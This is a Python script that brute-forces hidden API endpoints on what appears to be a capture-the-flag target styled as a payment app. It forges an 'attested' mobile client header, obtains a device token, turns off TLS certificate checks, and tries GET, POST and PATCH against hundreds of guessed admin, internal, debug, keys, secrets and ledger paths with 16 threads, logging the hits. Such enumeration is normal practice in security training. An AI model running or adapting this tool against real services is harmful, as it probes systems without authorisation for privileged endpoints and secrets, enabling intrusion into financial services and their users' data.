import json, ssl, urllib.request, urllib.error, threading, queue, itertools, sys, re

BASE = "https://web-3f25599ac74e8a91.web.h7tex.com"
CTX = ssl.create_default_context(); CTX.check_hostname=False; CTX.verify_mode=ssl.CERT_NONE
CL = "MeridianPay-Android/3.2.1 (attested)"

def raw(p, m="GET", b=None, t=None, cl=CL, hdrs=None):
    h = {"Content-Type": "application/json"}
    if cl: h["X-Meridian-Client"] = cl
    if t: h["Authorization"] = "Bearer " + t
    if hdrs: h.update(hdrs)
    d = json.dumps(b).encode() if b is not None else None
    r = urllib.request.Request(BASE+p, data=d, method=m, headers=h)
    try:
        with urllib.request.urlopen(r, context=CTX, timeout=8) as f: return f.status, f.read().decode("utf-8","replace")
    except urllib.error.HTTPError as e: return e.code, e.read().decode("utf-8","replace")
    except Exception as e: return None, repr(e)

_, t = raw("/api/v1/auth/device","POST",{"device_id":"brute"})
TOKEN = json.loads(t)["token"]

NOUNS = """admin administrator audit ledger book books journal consolidated corporate master_key keys key keyset keystore
internal debug diag diagnostics health info metrics stats version config settings env secrets secret flag flags
user users account accounts customer customers member members profile identity kyc person people staff employee employees
promo promotions offer offers loyalty enroll enrollment campaign referral referrals reward rewards points bonus
transfer transfers transaction transactions txn tx payment payments money payout payouts settlement settled
receipt receipts invoice invoices statement statements documents document file files export downloads download attachment attachments
device devices session sessions token tokens auth authenticate login logout register signup attestation attest verify verified signature signed
webhook webhooks callback events notifications messages inbox chat feed search query report reports analytics
card cards wallet wallets balance balances iban swift routing account_number
mobile android app client sdk api gateway proxy fetch url redirect open link links deeplink intent provider content share
risk fraud score override admin_notes note memo ticket tickets support
flag1 flag2 flag3 v1 v2 v3 v4 objective objectives part parts stage stages level levels step steps hint hints solution""".split()

PREFIXES = ["/api/v1/", "/api/", "/", "/api/v1/internal/", "/api/v1/admin/", "/api/v1/debug/",
            "/api/v1/mobile/", "/api/v1/auth/", "/api/v1/internal/admin/", "/api/v1/v1/", "/api/v2/", "/internal/"]

q = queue.Queue()
for p in PREFIXES:
    for n in NOUNS:
        q.put(p+n)
    for a in ("flag","ledger","keys","promo","users","config"):
        for pr in ("/api/v1/","/api/v1/internal/","/api/v1/admin/"):
            q.put(pr+a.replace("flag","flag"))
q.put("/api/v1/admin/ledger")
seen=set(); tasks=[]
while not q.empty():
    x=q.get()
    if x not in seen: seen.add(x); tasks.append(x)

found=[]; lock=threading.Lock()
def work(path):
    hits=[]
    for m in ("GET","POST","PATCH"):
        c,b = raw(path, m, {} if m!="GET" else None, TOKEN)
        if c and c != 404 and "404 Not Found" not in b:
            hits.append((m,c,b[:300]))
    if hits:
        with lock:
            found.append((path,hits)); print("==",path,hits,flush=True)

th=[threading.Thread(target=lambda: None)]
from concurrent.futures import ThreadPoolExecutor
with ThreadPoolExecutor(max_workers=16) as ex:
    list(ex.map(work, tasks))
print("\nTOTAL", len(found))
json.dump([(p,[[m,c,b] for m,c,b in h]) for p,h in found], open("brute_found.json","w"), indent=1)
